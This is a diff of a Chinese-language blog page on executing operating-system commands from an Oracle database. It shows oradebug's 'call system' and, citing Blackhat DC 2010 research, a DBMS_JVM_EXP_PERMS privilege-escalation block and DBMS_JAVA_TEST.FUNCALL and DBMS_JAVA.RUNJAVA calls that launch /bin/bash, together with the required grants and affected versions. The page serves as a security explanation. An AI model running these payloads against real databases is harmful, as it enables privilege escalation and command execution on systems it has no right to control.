+DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes
+MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname <span class="hljs-keyword">in</span> double quotes
+HANGANALYZE    [level] [syslevel]        Analyze<span class="hljs-built_in"> system </span>hang
+FFBEGIN                                  Flash Freeze the<span class="hljs-built_in"> Instance</span>
+<span class="hljs-built_in"></span>FFDEREGISTER                             FF deregister<span class="hljs-built_in"> instance </span><span class="hljs-keyword">from</span> cluster
+FFTERMINST                               Call exit <span class="hljs-keyword">and</span> terminate<span class="hljs-built_in"> instance</span>
+<span class="hljs-built_in"></span>FFRESUMEINST                             Resume the flash frozen<span class="hljs-built_in"> instance</span>
+<span class="hljs-built_in"></span>FFSTATUS                                 Flash freeze status of<span class="hljs-built_in"> instance</span>
+<span class="hljs-built_in"></span>SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs <span class="hljs-keyword">to</span> names
+WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory
+DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint
+SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints
+DIRECT_ACCESS  &lt;set/enable/<span class="hljs-built_in">disable</span> command | select query&gt; Fixed table access
+CORE                                     Dump core without crashing process
+IPC                                      Dump ipc information
+UNLIMIT                                  Unlimit the size of the trace file
+PROCSTAT                                 Dump process statistics
+CALL           [-t count] &lt;func&gt; [arg1]<span class="hljs-built_in">..</span>.[argn]  Invoke function with arguments</code></pre></div>
 
 <p>功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。</p>
 <h4 id="执行的语句"><a href="#执行的语句" class="headerlink" title="执行的语句"></a>执行的语句</h4><p><code>oradebug setmypid; oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
@@ -403,17 +524,26 @@
 <li>Linux 和 Windows 下的ORACLE都能利用成功</li>
 </ol>
 <h2 id="2-黑客方法"><a href="#2-黑客方法" class="headerlink" title="2. 黑客方法"></a>2. 黑客方法</h2><p>下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向<br>发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞<br>已经被被修复)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">DECLARE<br>POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;<br>CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="hljs-string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;<br>BEGIN<br>OPEN C1;<br>FETCH C1 BULK COLLECT INTO POL;<br>CLOSE C1;<br>DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);<br>END;<br>/<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs java">DECLARE
+POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
+CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="hljs-string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;
+BEGIN
+OPEN C1;
+FETCH C1 BULK COLLECT INTO POL;
+CLOSE C1;
+DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+END;
+/</code></pre></div>
 
 <p>在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session<br>权限的用户可以给自己授权所有java 权限。</p>
-<h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="hljs-string">&#x27;main&#x27;</span>,<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure>
+<h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="hljs-string">&#x27;main&#x27;</span>,<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,<span class="hljs-string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="hljs-keyword">from</span> dual;</code></pre></div>
 
-<h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);</code></pre></div>
 
 <h4 id="2-1-3-受影响系统"><a href="#2-1-3-受影响系统" class="headerlink" title="2.1.3 受影响系统"></a>2.1.3 受影响系统</h4><p>11g R1, 11g R2</p>
-<h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="hljs-keyword">FROM</span> DUAL;<br></code></pre></td></tr></table></figure>
+<h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="hljs-string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="hljs-keyword">FROM</span> DUAL;</code></pre></div>
 
-<h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> dbms_java.grant_permission(<span class="hljs-string">&#x27;SCOTT&#x27;</span>, <span class="hljs-string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="hljs-string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;execute&#x27;</span>);</code></pre></div>
 
 <h4 id="2-2-3-受影响系统"><a href="#2-2-3-受影响系统" class="headerlink" title="2.2.3 受影响系统"></a>2.2.3 受影响系统</h4><p>10g R2, 11g R1, 11g R2</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
